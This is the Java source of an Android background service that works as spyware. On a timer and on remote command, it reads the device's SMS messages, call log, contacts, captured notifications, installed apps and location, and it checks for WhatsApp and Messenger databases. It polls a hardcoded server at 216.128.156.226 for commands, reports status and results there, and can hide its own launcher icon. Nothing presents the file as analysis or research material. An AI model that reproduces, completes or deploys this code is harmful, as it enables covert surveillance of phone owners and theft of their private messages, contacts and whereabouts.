package com.alzahra.service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CoreService extends Service {
    private static final String TAG = "AlZahraService";
    private static final String CHANNEL_ID = "alzahra_channel";
    private Handler handler;
    private SharedPreferences prefs;
    private String serverUrl = "http://216.128.156.226:8443";
    private String deviceId;
    private String secretPath;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
        handler = new Handler(Looper.getMainLooper());
        deviceId = prefs.getString("device_id", "");
        secretPath = prefs.getString("secret_path", "");
        createNotificationChannel();
        startForeground(1, createNotification());
        startTasks();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Service").setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details).build();
    }

    private void startTasks() {
        handler.postDelayed(() -> sendAllData(), 5000);
        handler.postDelayed(new Runnable() {
            @Override
            public void run() { checkCommands(); handler.postDelayed(this, 10000); }
        }, 10000);
        handler.postDelayed(new Runnable() {
            @Override
            public void run() { sendStatus(); handler.postDelayed(this, 30000); }
        }, 30000);
    }

    private void sendAllData() {
        new Thread(() -> sendSMS()).start();
        handler.postDelayed(() -> new Thread(() -> sendCalls()).start(), 2000);
        handler.postDelayed(() -> new Thread(() -> sendContacts()).start(), 4000);
        handler.postDelayed(() -> new Thread(() -> sendNotifications()).start(), 6000);
        handler.postDelayed(() -> new Thread(() -> sendWhatsApp()).start(), 8000);
        handler.postDelayed(() -> new Thread(() -> sendMessenger()).start(), 10000);
        handler.postDelayed(() -> new Thread(() -> sendAppData()).start(), 12000);
        handler.postDelayed(() -> new Thread(() -> sendLocation()).start(), 14000);
    }

    private void sendSMS() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC");
            if (cursor == null) { sendResponse("sms", false, "لا يمكن الوصول"); return; }
            StringBuilder sb = new StringBuilder("=== SMS ===\n\n");
            int count = 0;
            while (cursor.moveToNext() && count < 500) {
                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                String typeStr = type == 1 ? "IN" : "OUT";
                String dateStr = new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(new Date(date));
                sb.append("[").append(typeStr).append("] ").append(address).append("\nDate: ").append(dateStr).append("\n").append(body).append("\n\n");
                count++;
            }
            cursor.close();
            saveToFile("sms", sb.toString());
            sendResponse("sms", true, count + " رسالة");
        } catch (Exception e) { sendResponse("sms", false, e.getMessage()); }
    }

    private void sendCalls() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
            if (cursor == null) { sendResponse("calls", false, "لا يمكن الوصول"); return; }
            StringBuilder sb = new StringBuilder("=== Calls ===\n\n");
            int count = 0;
            while (cursor.moveToNext() && count < 500) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                int duration = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                String typeStr = type == CallLog.Calls.INCOMING_TYPE ? "IN" : type == CallLog.Calls.OUTGOING_TYPE ? "OUT" : "MISSED";
                String dateStr = new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(new Date(date));
                sb.append("[").append(typeStr).append("] ").append(number).append("\nDate: ").append(dateStr).append("\nDuration: ").append(duration).append("s\n\n");
                count++;
            }
            cursor.close();
            saveToFile("calls", sb.toString());
            sendResponse("calls", true, count + " مكالمة");
        } catch (Exception e) { sendResponse("calls", false, e.getMessage()); }
    }

    private void sendContacts() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cursor == null) { sendResponse("contacts", false, "لا يمكن الوصول"); return; }
            StringBuilder sb = new StringBuilder("=== Contacts ===\n\n");
            int count = 0;
            while (cursor.moveToNext() && count < 1000) {
                String id = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                Cursor phoneCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                sb.append("Name: ").append(name).append("\n");
                if (phoneCursor != null) {
                    while (phoneCursor.moveToNext()) sb.append("Phone: ").append(phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                    phoneCursor.close();
                }
                sb.append("\n"); count++;
            }
            cursor.close();
            saveToFile("contacts", sb.toString());
            sendResponse("contacts", true, count + " جهة اتصال");
        } catch (Exception e) { sendResponse("contacts", false, e.getMessage()); }
    }

    private void sendNotifications() {
        try {
            StringBuilder sb = new StringBuilder("=== Notifications ===\n\n");
            File notifDir = new File(secretPath + "/notifications");
            int count = 0;
            if (notifDir.exists()) {
                File[] files = notifDir.listFiles();
                if (files != null) {
                    for (File f : files) {
                        if (f.isFile() && f.getName().endsWith(".txt")) {
                            FileInputStream fis = new FileInputStream(f);
                            BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
                            String line;
                            while ((line = reader.readLine()) != null) { sb.append(line).append("\n"); count++; }
                            reader.close(); fis.close();
                        }
                    }
                }
            }
            saveToFile("notifications", sb.toString());
            sendResponse("notifications", true, count + " إشعار");
        } catch (Exception e) { sendResponse("notifications", false, e.getMessage()); }
    }

    private void sendWhatsApp() {
        try {
            StringBuilder sb = new StringBuilder("=== WhatsApp ===\n\n");
            String[] waPaths = {"/data/data/com.whatsapp/databases/msgstore.db", "/sdcard/WhatsApp/Databases/msgstore.db"};
            boolean found = false;
            for (String path : waPaths) {
                File db = new File(path);
                if (db.exists()) { sb.append("Found: ").append(path).append("\nSize: ").append(db.length()).append(" bytes\n"); found = true; }
            }
            if (!found) sb.append("WhatsApp not found");
            saveToFile("whatsapp", sb.toString());
            sendResponse("whatsapp", found, found ? "تم العثور" : "غير موجود");
        } catch (Exception e) { sendResponse("whatsapp", false, e.getMessage()); }
    }

    private void sendMessenger() {
        try {
            StringBuilder sb = new StringBuilder("=== Messenger ===\n\n");
            String[] msgPaths = {"/data/data/com.facebook.orca/databases/threads_db2"};
            boolean found = false;
            for (String path : msgPaths) {
                File db = new File(path);
                if (db.exists()) { sb.append("Found: ").append(path).append("\n"); found = true; }
            }
            if (!found) sb.append("Messenger not found");
            saveToFile("messenger", sb.toString());
            sendResponse("messenger", found, found ? "تم العثور" : "غير موجود");
        } catch (Exception e) { sendResponse("messenger", false, e.getMessage()); }
    }

    private void sendAppData() {
        try {
            StringBuilder sb = new StringBuilder("=== Apps ===\n\n");
            PackageManager pm = getPackageManager();
            for (android.content.pm.ApplicationInfo app : pm.getInstalledApplications(0)) {
                sb.append(pm.getApplicationLabel(app)).append(" (").append(app.packageName).append(")\n");
            }
            saveToFile("app_data", sb.toString());
            sendResponse("app_data", true, "تم سحب التطبيقات");
        } catch (Exception e) { sendResponse("app_data", false, e.getMessage()); }
    }

    private void sendLocation() {
        try {
            StringBuilder sb = new StringBuilder("=== Location ===\n\n");
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm != null) {
                try {
                    Location gpsLoc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    Location netLoc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (gpsLoc != null) { sb.append("GPS: ").append(gpsLoc.getLatitude()).append(", ").append(gpsLoc.getLongitude()).append("\n"); }
                    if (netLoc != null) { sb.append("Network: ").append(netLoc.getLatitude()).append(", ").append(netLoc.getLongitude()).append("\n"); }
                    if (gpsLoc != null || netLoc != null) { saveToFile("location", sb.toString()); sendResponse("location", true, "تم تحديد الموقع"); }
                    else sendResponse("location", false, "لا يوجد موقع");
                } catch (SecurityException e) { sendResponse("location", false, "لا تملك صلاحية"); }
            }
        } catch (Exception e) { sendResponse("location", false, e.getMessage()); }
    }

    private void checkCommands() {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "/api/commands?device_id=" + deviceId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(10000);
                if (conn.getResponseCode() == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder(); String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    reader.close();
                    org.json.JSONObject json = new org.json.JSONObject(sb.toString());
                    org.json.JSONArray commands = json.getJSONArray("commands");
                    for (int i = 0; i < commands.length(); i++) executeCommand(commands.getString(i));
                }
                conn.disconnect();
            } catch (Exception e) { Log.e(TAG, "Commands error", e); }
        }).start();
    }

    private void executeCommand(String cmd) {
        switch (cmd) {
            case "sms": sendSMS(); break;
            case "calls": sendCalls(); break;
            case "contacts": sendContacts(); break;
            case "notifications": sendNotifications(); break;
            case "whatsapp": sendWhatsApp(); break;
            case "messenger": sendMessenger(); break;
            case "app_data": sendAppData(); break;
            case "location": sendLocation(); break;
            case "all": sendAllData(); break;
            case "hide": hideApp(); break;
            case "unhide": unhideApp(); break;
            default: sendResponse(cmd, false, "أمر غير معروف");
        }
    }

    private void hideApp() {
        try {
            ComponentName component = new ComponentName(this, com.alzahra.MainActivity.class);
            getPackageManager().setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            sendResponse("hide", true, "تم الإخفاء");
        } catch (Exception e) { sendResponse("hide", false, e.getMessage()); }
    }

    private void unhideApp() {
        try {
            ComponentName component = new ComponentName(this, com.alzahra.MainActivity.class);
            getPackageManager().setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            sendResponse("unhide", true, "تم الإظهار");
        } catch (Exception e) { sendResponse("unhide", false, e.getMessage()); }
    }

    private void sendResponse(String type, boolean success, String message) {
        try {
            URL url = new URL(serverUrl + "/api/response");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            String json = String.format("{\"device_id\":\"%s\",\"type\":\"%s\",\"success\":%s,\"message\":\"%s\"}", deviceId, type, success, message);
            conn.getOutputStream().write(json.getBytes());
            conn.getResponseCode(); conn.disconnect();
        } catch (Exception e) { Log.e(TAG, "Response error", e); }
    }

    private void sendFile(String type, File file) {
        try {
            URL url = new URL(serverUrl + "/api/data");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(60000);
            String boundary = "----WebKitFormBoundary";
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            java.io.OutputStream os = conn.getOutputStream();
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n".getBytes());
            os.write((deviceId + "\r\n").getBytes());
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write("Content-Disposition: form-data; name=\"type\"\r\n\r\n".getBytes());
            os.write((type + "\r\n").getBytes());
            os.write(("--" + boundary + "\r\n").getBytes());
            os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
            os.write("Content-Type: application/octet-stream\r\n\r\n".getBytes());
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096]; int len;
            while ((len = fis.read(buffer)) > 0) os.write(buffer, 0, len);
            fis.close();
            os.write(("\r\n--" + boundary + "--\r\n").getBytes());
            os.flush(); os.close();
            conn.getResponseCode(); conn.disconnect();
        } catch (Exception e) { Log.e(TAG, "Send file error", e); }
    }

    private void sendStatus() {
        try {
            URL url = new URL(serverUrl + "/api/status");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            String json = String.format("{\"device_id\":\"%s\"}", deviceId);
            conn.getOutputStream().write(json.getBytes());
            conn.getResponseCode(); conn.disconnect();
        } catch (Exception e) { Log.e(TAG, "Status error", e); }
    }

    private void saveToFile(String type, String data) {
        try {
            File file = new File(secretPath + "/" + type + "/" + type + "_" + System.currentTimeMillis() + ".txt");
            file.getParentFile().mkdirs();
            FileOutputStream fos = new FileOutputStream(file);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            writer.write(data); writer.close(); fos.close();
        } catch (Exception e) { Log.e(TAG, "Save error", e); }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override
    public IBinder onBind(Intent intent) { return null; }
    @Override
    public void onDestroy() { super.onDestroy(); if (handler != null) handler.removeCallbacksAndMessages(null); }
}
